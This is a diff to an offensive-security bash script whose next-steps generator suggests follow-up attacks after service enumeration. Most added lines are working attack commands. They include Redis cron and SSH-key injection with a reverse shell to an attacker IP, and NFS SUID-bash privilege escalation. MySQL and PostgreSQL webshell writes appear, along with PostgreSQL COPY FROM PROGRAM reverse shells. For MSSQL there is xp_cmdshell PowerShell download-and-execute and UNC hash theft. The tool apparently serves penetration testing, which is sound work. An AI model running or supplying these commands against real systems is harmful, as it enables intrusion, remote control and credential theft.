@@ -2026,6 +2026,14 @@ generate_next_steps() {
                 "smbclient -L //$ip -U '<DOMAIN>/<USER>%<PASS>'" \
                 "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
         fi
+        append_next_finding "$next_file" \
+            "SMB vulnerability checks" \
+            "SMB open — run standard vuln scripts" \
+            "nmap --script smb-vuln-ms17-010 -p 445 $ip" \
+            "nmap --script smb-vuln-ms08-067 -p 445 $ip" \
+            "nmap --script smb2-security-mode -p 445 $ip" \
+            "netexec smb $ip -M zerologon" \
+            "netexec smb $ip -M petitpotam"
     fi
 
     local winrm_port
@@ -2140,7 +2148,11 @@ generate_next_steps() {
             "showmount -e $ip" \
             "mkdir -p /mnt/nfs_${ip//./_}" \
             "mount -t nfs $ip:${export_path} /mnt/nfs_${ip//./_}" \
-            "find /mnt/nfs_${ip//./_} -maxdepth 3 -type f -ls 2>/dev/null"
+            "find /mnt/nfs_${ip//./_} -maxdepth 3 -type f -ls 2>/dev/null" \
+            "cat /mnt/nfs_${ip//./_}/etc/exports 2>/dev/null  # check no_root_squash" \
+            "# If no_root_squash: copy SUID bash to share from Kali (as root):" \
+            "cp /bin/bash /mnt/nfs_${ip//./_}/tmp/bash && chmod +s /mnt/nfs_${ip//./_}/tmp/bash" \
+            "# Then on target: /tmp/bash -p  → root shell"
     fi
 
     if grep -qi 'REDIS NO-AUTH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
@@ -2149,7 +2161,17 @@ generate_next_steps() {
             "$target_dir/loot/quick_wins.txt contains REDIS NO-AUTH" \
             "redis-cli -h $ip INFO" \
             "redis-cli -h $ip KEYS '*'" \
-            "redis-cli -h $ip CONFIG GET '*'"
+            "redis-cli -h $ip CONFIG GET '*'" \
+            "# RCE via cron injection (Linux only):" \
+            "redis-cli -h $ip CONFIG SET dir /var/spool/cron/crontabs/" \
+            "redis-cli -h $ip CONFIG SET dbfilename root" \
+            "redis-cli -h $ip SET payload \$'\\n\\n* * * * * bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\\n\\n'" \
+            "redis-cli -h $ip BGSAVE" \
+            "# RCE via SSH key injection (if /root/.ssh/ writable):" \
+            "ssh-keygen -t rsa -f /tmp/redis_key -N '' && (echo -e '\\n'; cat /tmp/redis_key.pub; echo -e '\\n') > /tmp/redis_pubkey.txt" \
+            "redis-cli -h $ip CONFIG SET dir /root/.ssh/ && redis-cli -h $ip CONFIG SET dbfilename authorized_keys" \
+            "redis-cli -h $ip SET sshkey \"\$(cat /tmp/redis_pubkey.txt)\" && redis-cli -h $ip BGSAVE" \
+            "ssh -i /tmp/redis_key root@$ip"
     fi
 
     if grep -qi 'LDAP anonymous bind' "$target_dir/loot/quick_wins.txt" 2>/dev/null && \
@@ -2174,7 +2196,12 @@ generate_next_steps() {
             "$target_dir/tcp/mysql/root_nopass.txt or quick_wins shows empty/root no-password access" \
             "mysql -h $ip -P $mysql_port -u root --password='' -e 'SHOW DATABASES;'" \
             "mysql -h $ip -P $mysql_port -u root --password='' -e 'SELECT user,host FROM mysql.user;'" \
-            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SHOW VARIABLES LIKE 'secure_file_priv';\""
+            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SHOW VARIABLES LIKE 'secure_file_priv';\"" \
+            "# Webshell write (if secure_file_priv is empty or points to web root):" \
+            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT '<?php system(\\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"" \
+            "# Then trigger: curl http://$ip/shell.php?cmd=id" \
+            "# Read local files:" \
+            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT LOAD_FILE('/etc/passwd');\""
     elif [[ -n "$mysql_port" ]]; then
         append_next_finding "$next_file" \
             "MySQL detected" \
@@ -2198,7 +2225,16 @@ generate_next_steps() {
             "$target_dir/loot/quick_wins.txt contains PostgreSQL LOGIN" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c '\\l'" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT usename,usesuper FROM pg_user;'" \
-            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user'"
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user'" \
+            "# Check for superuser (enables COPY TO PROGRAM RCE):" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT current_setting($$is_superuser$$);'" \
+            "# RCE via COPY TO PROGRAM (superuser only):" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);\"" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'id';\"" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT * FROM cmd_exec;'" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\\\"';\"" \
+            "# Webshell write via COPY TO (needs web root write access):" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';\""
     elif [[ -n "$pg_port" ]]; then
         append_next_finding "$next_file" \
             "PostgreSQL detected" \
@@ -2262,7 +2298,14 @@ generate_next_steps() {
             "netexec mssql $ip -u <USER> -p '<PASS>'" \
             "impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>@$ip' -windows-auth" \
             "impacket-mssqlclient '<USER>:<PASS>@$ip' -port $mssql_port" \
-            "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip"
+            "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip" \
+            "# After login — enable and use xp_cmdshell for RCE:" \
+            "# SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;" \
+            "# SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" \
+            "# SQL> EXEC xp_cmdshell 'whoami';" \
+            "# SQL> EXEC xp_cmdshell 'powershell -c IEX(IWR http://<KALI_IP>/shell.ps1 -UseBasicParsing)'" \
+            "# Steal hashes via UNC path:" \
+            "# SQL> EXEC xp_dirtree '\\\\<KALI_IP>\\share'   # then catch with responder"
     fi
 
     local rdp_port
